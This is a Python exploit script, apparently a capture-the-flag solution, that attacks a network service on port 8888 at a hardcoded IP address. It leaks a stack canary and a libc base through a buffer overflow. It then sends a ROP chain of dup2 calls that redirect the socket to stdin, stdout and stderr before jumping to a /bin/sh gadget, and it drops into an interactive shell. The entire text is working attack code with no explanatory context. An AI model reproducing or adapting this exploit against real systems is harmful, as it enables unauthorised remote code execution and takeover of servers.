from isis import *
import re

exec_bin_sh=0x8048C62

def special_move(s,ptr):
	s.send('5\n')
	s.recv(0x10000)
	s.send('r\n')
	s.recv(0x10000)
	s.send(lei(ptr))
	s.recv(0x10000)
	return s

def buffer_overflow_leak(s,l):
	s.send('4\n')
	time.sleep(1)
	s.recv(0x10000)
	s.send('y{}'.format('y'*(l-1)))
	time.sleep(2)
	res=s.recv(0x10000)
	try:
		data=re.findall('({})(.*)(\'!\n)'.format('y'*(l)),res)[0][1]
	except Exception as e:
		print e
		print res
		return
	return data

def get_cookie(s):
	data=buffer_overflow_leak(s,11)
	return unpack('I',('\0'+data[:3]))[0]

def get_libc(s):
	data=buffer_overflow_leak(s,18)
	value= unpack('I',(data[:4]))[0]
	value=value-35-0x0e0890
	#value=value-35-0x00df210 #ubuntu 12.04
	return value

def get_dup2(libc):
	return libc+0x00e11f0
	#return libc+0x00dfba0 #ubuntu 12.04

ppr=0x08048b2d

def buffer_overflow(s,cookie,data):
	s.send('4\n')
	s.recv(0x10000)
	payload='y'*12+lei(cookie)+'A'*4+'B'*4+'C'*4+data
	assert(len(payload)<=0x110)
	s.send(payload)
	s.recv(0x10000)

target='localhost'
target='58.229.183.18'
s=get_socket((target,8888))

time.sleep(2)
cookie=get_cookie(s)
print "cookie: {}".format(hex(cookie))
s=get_socket((target,8888))
time.sleep(2)
libc=get_libc(s)
print "libc: {}".format(hex(libc))

dup2=get_dup2(libc)
print "dup2: {}".format(hex(dup2))

s=get_socket((target,8888))
time.sleep(2)

myfd=4
rop=lei(dup2,ppr,myfd,0,
		dup2,ppr,myfd,1,
		dup2,exec_bin_sh,myfd,2)

buffer_overflow(s,cookie,rop)
telnet_shell(s)
